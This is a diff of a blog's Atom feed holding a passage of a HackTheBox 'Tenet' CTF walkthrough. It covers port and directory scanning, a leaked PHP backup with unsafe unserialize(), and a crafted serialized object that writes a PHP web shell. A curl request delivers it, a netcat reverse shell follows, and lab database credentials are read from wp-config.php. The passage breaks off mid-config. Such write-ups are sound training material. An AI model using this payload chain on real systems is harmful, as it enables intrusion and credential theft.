@@ -1,5 +1,699 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-02T19:27:11-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
-</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Hawk (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html" rel="alternate" type="text/html" title="HackTheBox - Hawk (medium)" /><published>2024-07-02T00:00:00-06:00</published><updated>2024-07-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-03T19:33:24-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Tenet (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/03/tenet.html" rel="alternate" type="text/html" title="HackTheBox - Tenet (medium)" /><published>2024-07-03T00:00:00-06:00</published><updated>2024-07-03T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/03/tenet</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/03/tenet.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/6bd8b01a1b84e16a5ee2e53d070339fd.png" />
+</p>
+
+<ul>
+  <li>Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it’s backup. It is possible after identificaiton of the backup file to review it’s source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user <code class="language-plaintext highlighter-rouge">www-data</code> to user <code class="language-plaintext highlighter-rouge">Neil</code>. Further system enumeration reveals that this user have root permissions to run a bash script through <code class="language-plaintext highlighter-rouge">sudo</code>. The script is writing SSH public keys to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file of the <code class="language-plaintext highlighter-rouge">root</code> user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file and use them to login to the system as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> ../nmap/targeted
+<span class="c"># Nmap 7.94SVN scan initiated Wed Jul  3 16:55:09 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.10.223</span>
+Nmap scan report <span class="k">for </span>10.10.10.223
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<ul>
+  <li>We see that a <strong>Wordpress</strong> is being used as a content management system.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> ../nmap/webScan
+<span class="c"># Nmap 7.94SVN scan initiated Wed Jul  3 16:57:31 2024 as: nmap --script=http-enum -p80 -oN webScan 10.10.10.223</span>
+Nmap scan report <span class="k">for </span>10.10.10.223
+Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|_  /wordpress/wp-login.php: Wordpress login page.
+</code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<ul>
+  <li>We see the technologies that are being used in the web service.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.223</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.223</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.223</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Apache2</span> <span class="no">Ubuntu</span> <span class="no">Default</span> <span class="no">Page</span><span class="p">:</span> <span class="no">It</span> <span class="n">works</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>If we go to see the web page as such we find this.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/1.png" />
+</p>
+
+<ul>
+  <li>But if we go to the route reported by <code class="language-plaintext highlighter-rouge">Nmap</code> we can see the <strong>Wordpress</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/2.png" />
+</p>
+
+<ul>
+  <li>We can see the subdomain <code class="language-plaintext highlighter-rouge">tenet.htb</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/3.png" />
+</p>
+
+<ul>
+  <li>So what we are going to do is to add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> so that the resources are displayed correctly.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.223 tenet.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.10.223 tenet.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Now it works.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/4.png" />
+</p>
+
+<ul>
+  <li>We are going <strong>Fuzzing</strong> to see if we can find any interesting routes.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://tenet.htb/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 100 <span class="nt">--no-error</span> <span class="nt">-x</span> php <span class="nt">-s</span> 200
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://tenet.htb/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 100
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              php
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2023/07/25 19:56:01 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/index.php            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/]
+/wp-content           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/wp-content/]
+/wp-login.php         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6534]                                  
+/wp-includes          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/wp-includes/]
+/wp-trackback.php     <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 135]                                    
+/wp-admin             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/wp-admin/]   
+/xmlrpc.php           <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 42]                                     
+/wp-signup.php        <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/wp-login.php?action<span class="o">=</span>register]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 274]                                                  
+                                                                                                 
+<span class="o">===============================================================</span>
+2024/07/03 18:07:30 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>They are the typical wordpress routes but here we find something interesting.</p>
+  </li>
+  <li>
+    <p>Version 5.6.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/5.png" />
+</p>
+
+<ul>
+  <li>We see the file.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/6.png" />
+</p>
+
+<ul>
+  <li>We don’t see anything interesting so far let’s fuzzing but now to search for subdomains.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster vhost <span class="nt">-u</span> http://tenet.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-t</span> 50 <span class="nt">--no-error</span>
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:          http://tenet.htb
+<span class="o">[</span>+] Method:       GET
+<span class="o">[</span>+] Threads:      50
+<span class="o">[</span>+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+<span class="o">[</span>+] User Agent:   gobuster/3.1.0
+<span class="o">[</span>+] Timeout:      10s
+<span class="o">===============================================================</span>
+2024/07/03 18:30:50 Starting gobuster <span class="k">in </span>VHOST enumeration mode
+<span class="o">===============================================================</span>
+Found: www.tenet.htb <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0]
+</code></pre></div></div>
+
+<ul>
+  <li>We add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
+10.10.10.223 tenet.htb www.tenet.htb
+</code></pre></div></div>
+
+<ul>
+  <li>But it redirects us to the domain that we already have.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/7.png" />
+</p>
+
+<ul>
+  <li>If we analyze a <strong>post</strong> of those on the web there is one which is called <strong>Migration</strong> and if we analyze it we see that there is a comment from the user <strong>neil</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/8.png" />
+</p>
+
+<ul>
+  <li>There is a path called <code class="language-plaintext highlighter-rouge">sator.php</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://tenet.htb/sator.php
+&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
+&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at tenet.htb Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>If we try setting the <code class="language-plaintext highlighter-rouge">IP</code> we can see that the situation changes.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://10.10.10.223/sator.php
+<span class="o">[</span>+] Grabbing <span class="nb">users </span>from text file &lt;br&gt;
+<span class="o">[]</span> Database updated &lt;br&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Something that was mentioned in the comments was about a <code class="language-plaintext highlighter-rouge">backup</code> so if we add to the path we have <code class="language-plaintext highlighter-rouge">.bak</code> we see that it exists as such.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://10.10.10.223/sator.php.bak
+&lt;?php
+
+class DatabaseExport
+<span class="o">{</span>
+	public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
+	public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+
+	public <span class="k">function </span>update_db<span class="o">()</span>
+	<span class="o">{</span>
+		<span class="nb">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
+		<span class="nv">$this</span>-&gt; data <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
+	<span class="o">}</span>
+
+
+	public <span class="k">function </span>__destruct<span class="o">()</span>
+	<span class="o">{</span>
+		file_put_contents<span class="o">(</span>__DIR__ <span class="nb">.</span> <span class="s1">'/'</span> <span class="nb">.</span> <span class="nv">$this</span> -&gt;user_file, <span class="nv">$this</span>-&gt;data<span class="o">)</span><span class="p">;</span>
+		<span class="nb">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
+	//	<span class="nb">echo</span> <span class="s1">'Gotta get this working properly...'</span><span class="p">;</span>
+	<span class="o">}</span>
+<span class="o">}</span>
+
+<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'arepo'</span><span class="o">]</span> ?? <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$databaseupdate</span> <span class="o">=</span> unserialize<span class="o">(</span><span class="nv">$input</span><span class="o">)</span><span class="p">;</span>
+
+<span class="nv">$app</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
+<span class="nv">$app</span> -&gt; update_db<span class="o">()</span><span class="p">;</span>
+
+
+?&gt;
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/9.png" />
+</p>
+
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+
+<h1 id="php-deserialization-attack">PHP Deserialization Attack</h1>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/web10.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Well as such they are letting us control our <code class="language-plaintext highlighter-rouge">input</code> which is processed by <strong>GET</strong> and as such is not applying sanitization and as such is employing the <code class="language-plaintext highlighter-rouge">arepo</code> parameter we are going to create a serealized data.</p>
+  </li>
+  <li>
+    <p>We are going to create a <strong>script in php</strong> to give us the <code class="language-plaintext highlighter-rouge">serialized</code> data since by means of the <code class="language-plaintext highlighter-rouge">cmd</code> parameter we are going to execute commands.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn serialize.php
+&lt;?php
+class DatabaseExport
+<span class="o">{</span>
+        public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'xd.php'</span><span class="p">;</span>
+        public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'&lt;?php system($_REQUEST["cmd"]); ?&gt;'</span><span class="p">;</span>
+<span class="o">}</span>
+
+<span class="nv">$pwned</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
+<span class="nb">echo </span>serialize<span class="o">(</span><span class="nv">$pwned</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>If we execute it we get the object <code class="language-plaintext highlighter-rouge">serealized</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ php serialize.php 2&gt;/dev/null<span class="p">;</span> <span class="nb">echo
+</span>O:14:<span class="s2">"DatabaseExport"</span>:2:<span class="o">{</span>s:9:<span class="s2">"user_file"</span><span class="p">;</span>s:6:<span class="s2">"xd.php"</span><span class="p">;</span>s:4:<span class="s2">"data"</span><span class="p">;</span>s:34:<span class="s2">"&lt;?php system(</span><span class="nv">$_REQUEST</span><span class="s2">["</span>cmd<span class="s2">"]); ?&gt;"</span><span class="p">;</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>We are going to send it all the data through the <code class="language-plaintext highlighter-rouge">arepo</code> parameter which is not sanitized and will interpret what we pass it since it is going to be derealized.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s2">"http://10.10.10.223/sator.php"</span> <span class="nt">--data-urlencode</span> <span class="s1">'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:6:"xd.php";s:4:"data";s:34:"&lt;?php system($_REQUEST["cmd"]); ?&gt;";}'</span><span class="p">;</span> <span class="nb">echo</span>
+<span class="o">[</span>+] Grabbing <span class="nb">users </span>from text file &lt;br&gt;
+<span class="o">[]</span> Database updated &lt;br&gt;[] Database updated &lt;br&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>We see that the <code class="language-plaintext highlighter-rouge">xd.php</code> file that we defined in the <code class="language-plaintext highlighter-rouge">script</code> was created correctly.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/rev.png" />
+</p>
+
+<ul>
+  <li>And now we can execute commands.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/rev2.png" />
+</p>
+
+<ul>
+  <li>Now we gain access to the system by sending us a <code class="language-plaintext highlighter-rouge">reverse shell</code>..</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/rev3.png" />
+</p>
+
+<ul>
+  <li>Now we receive the shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.223] 49860
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1678<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@tenet:/var/www/html<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+www-data@tenet:/var/www/html<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
+script /dev/null <span class="nt">-c</span> bash
+Script started, file is /dev/null
+www-data@tenet:/var/www/html<span class="nv">$ </span>^Z
+<span class="o">[</span>1]  + 37998 suspended  nc <span class="nt">-nlvp</span> 443
+❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1]  + 37998 continued  nc <span class="nt">-nlvp</span> 443
+                                    reset xterm
+ENTER
+www-data@tenet:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+
+<h2 id="neil-shell">neil shell</h2>
+
+<ul>
+  <li>We found credentials..</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@tenet:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 228
+drwxr-xr-x  5 www-data www-data  4096 Jul  3 22:57 <span class="nb">.</span>
+drwxr-xr-x  3 www-data www-data  4096 Jul  4 00:32 ..
+<span class="nt">-rw-r--r--</span>  1 www-data www-data   405 Feb  6  2020 index.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data 19915 Feb 12  2020 license.txt
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  7278 Jun 26  2020 readme.html
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  7101 Jul 28  2020 wp-activate.php
+drwxr-xr-x  9 www-data www-data  4096 Dec  8  2020 wp-admin
+<span class="nt">-rw-r--r--</span>  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  2328 Oct  8  2020 wp-comments-post.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  2913 Feb  6  2020 wp-config-sample.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  3185 Jan  7  2021 wp-config.php
+drwxr-xr-x  5 www-data www-data  4096 Jul  3 22:57 wp-content
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  3939 Jul 30  2020 wp-cron.php
+drwxr-xr-x 25 www-data www-data 12288 Dec  8  2020 wp-includes
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  3300 Feb  6  2020 wp-load.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data 49831 Nov  9  2020 wp-login.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data 20975 Nov 12  2020 wp-settings.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data 31337 Sep 30  2020 wp-signup.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  4747 Oct  8  2020 wp-trackback.php
+<span class="nt">-rw-r--r--</span>  1 www-data www-data  3236 Jun  8  2020 xmlrpc.php
+www-data@tenet:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
+&lt;?php
+/<span class="k">**</span>
+ <span class="k">*</span> The base configuration <span class="k">for </span>WordPress
+ <span class="k">*</span>
+ <span class="k">*</span> The wp-config.php creation script uses this file during the
+ <span class="k">*</span> installation. You don<span class="s1">'t have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( '</span>DB_NAME<span class="s1">', '</span>wordpress<span class="s1">' );
+
+/** MySQL database username */
+define( '</span>DB_USER<span class="s1">', '</span>neil<span class="s1">' );
+
+/** MySQL database password */
+define( '</span>DB_PASSWORD<span class="s1">', '</span>Opera2112<span class="s1">' );
+
+/** MySQL hostname */
+define( '</span>DB_HOST<span class="s1">', '</span>localhost<span class="s1">' );
+
+/** Database Charset to use in creating database tables. */
+define( '</span>DB_CHARSET<span class="s1">', '</span>utf8mb4<span class="s1">' );
+
+/** The Database Collate type. Don'</span>t change this <span class="k">if in </span>doubt. <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'DB_COLLATE'</span>, <span class="s1">''</span> <span class="o">)</span><span class="p">;</span>
+
+define<span class="o">(</span> <span class="s1">'WP_HOME'</span>, <span class="s1">'http://tenet.htb'</span><span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'WP_SITEURL'</span>, <span class="s1">'http://tenet.htb'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span><span class="c">#@+</span>
+ <span class="k">*</span> Authentication Unique Keys and Salts.
+ <span class="k">*</span>
+ <span class="k">*</span> Change these to different unique phrases!
+ <span class="k">*</span> You can generate these using the <span class="o">{</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span class="o">}</span>
+ <span class="k">*</span> You can change these at any point <span class="k">in </span><span class="nb">time </span>to invalidate all existing cookies. This will force all <span class="nb">users </span>to have to log <span class="k">in </span>again.
+ <span class="k">*</span>
+ <span class="k">*</span> @since 2.6.0
+ <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'AUTH_KEY'</span>,         <span class="s1">'QiuK;~(mBy7H3y8G;*|^*vGekSuuxKV$:Tc&gt;5qKr`T}(t?+`r.+`gg,Ul,=!xy6d'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'SECURE_AUTH_KEY'</span>,  <span class="s1">'x3q&amp;hwYy]:S{l;jDU0D&amp;./@]GbBz(P~}]y=3deqO1ZB/`P:GU&lt;tJ[v)4&gt;&lt;}wl_~N'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'LOGGED_IN_KEY'</span>,    <span class="s1">'JrJ_u34gQ3(x7y_Db8`9%@jq&lt;;{aqQk(Z+uZ|}M,l?6.~Fo/~Tr{0bJIW?@.*|Nu'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'NONCE_KEY'</span>,        <span class="s1">'=z0ODLKO{9K;&lt;,&lt;gT[f!y_*1QgIc;#FoN}pvHNP`|hi/;cwK=vCwcC~nz&amp;0:ajW#'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'AUTH_SALT'</span>,        <span class="s1">'*.;XACYRMNvA?.r)f~}+A,eMke?/i^O6j$vhZA&lt;E5Vp#N[a{YL TY^-Q[X++u@Ab'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'SECURE_AUTH_SALT'</span>, <span class="s1">'NtFPN?_NXFqW-Bm6Jv,v-KkjS^8Hz@BIcxc] F}(=v1$B@F/j(`b`7{A$T{DG|;h'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'LOGGED_IN_SALT'</span>,   <span class="s1">'d14m0mBP eIawFxLs@+CrJz#d(88cx4||&lt;6~_U3F=aCCiyN|]Hr{(mC5&lt; R57zmn'</span> <span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span> <span class="s1">'NONCE_SALT'</span>,       <span class="s1">'Srtt&amp;}(~:K(R(q(FMK&lt;}}%Zes!4%!S`V!KSk)Rlq{&gt;Y?f&amp;b`&amp;NW[INM2,a9Zm,SH'</span> <span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span><span class="c">#@-*/</span>
+
+/<span class="k">**</span>
+ <span class="k">*</span> WordPress Database Table prefix.
+ <span class="k">*</span>
+ <span class="k">*</span> You can have multiple installations <span class="k">in </span>one database <span class="k">if </span>you give each
+ <span class="k">*</span> a unique prefix. Only numbers, letters, and underscores please!
+ <span class="k">*</span>/
+<span class="nv">$table_prefix</span> <span class="o">=</span> <span class="s1">'wp_'</span><span class="p">;</span>
+
+/<span class="k">**</span>
+ <span class="k">*</span> For developers: WordPress debugging mode.
+ <span class="k">*</span>
+ <span class="k">*</span> Change this to <span class="nb">true </span>to <span class="nb">enable </span>the display of notices during development.
+ <span class="k">*</span> It is strongly recommended that plugin and theme developers use WP_DEBUG
+ <span class="k">*</span> <span class="k">in </span>their development environments.
+ <span class="k">*</span>
+ <span class="k">*</span> For information on other constants that can be used <span class="k">for </span>debugging,
+ <span class="k">*</span> visit the documentation.
+ <span class="k">*</span>
+ <span class="k">*</span> @link https://wordpress.org/support/article/debugging-in-wordpress/
+ <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'WP_DEBUG'</span>, <span class="nb">false</span> <span class="o">)</span><span class="p">;</span>
